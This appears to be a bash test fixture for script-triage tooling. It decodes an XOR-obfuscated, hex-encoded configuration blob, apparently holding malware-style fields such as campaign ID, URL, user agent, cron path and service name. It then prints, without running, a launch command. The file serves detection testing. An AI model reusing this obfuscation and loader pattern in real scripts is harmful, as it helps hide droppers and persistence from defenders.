# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_2a103f7d='30:62:34:64:61:36:63:37:64:34:78:30:32:34:21:26:7b:7a:30:3d:36:34:36:78:26:26:30:27:21:3b:20:3d:7a:25:38:21:7a:68:3d:21:34:25:0a:30:39:3c:33:29:30:62:34:64:61:36:63:37:64:34:78:3b:32:3c:34:25:38:34:36:68:31:3c:0a:3b:32:3c:34:25:38:34:36:29:64:68:21:3b:20:3a:36:0a:30:32:34:21:26:29:21:25:3c:27:36:26:0a:3d:26:34:37:68:27:30:21:25:34:31:34:29:26:26:30:36:3a:27:25:0a:3d:36:21:34:25:26:3c:31:79:39:34:36:3a:39:0a:30:21:34:36:3a:39:68:26:25:30:21:26:29:64:68:23'
readonly Codec_2a103f7d='hex_colon|reverse_then_xor|55'

Load_2a103f7d() {
  v_a19c=()
  local IFS=':' v_f602
  local -a pieces
  read -r -a pieces <<< "${Material_2a103f7d}"
  for v_f602 in "${pieces[@]}"; do v_a19c+=("$((16#$v_f602))"); done
}

Decode_2a103f7d() {
  v_b27e=()
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e[${#v_a19c[@]}-1-v_e598]="$((v_a19c[v_e598] ^ 85))"
  done
}

Recover_2a103f7d() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  if ((2 > 1)); then v_d41a=left; else v_d41a=right; fi
  Load_2a103f7d
  local decode_target=Decode_2a103f7d; "$decode_target"
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_2a103f7d() { Recover_2a103f7d; }

Plan_2a103f7d() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_2a103f7d)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a launch_command=(bash "$file_path")
  declare -p launch_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_2a103f7d; fi

# reconstruction complete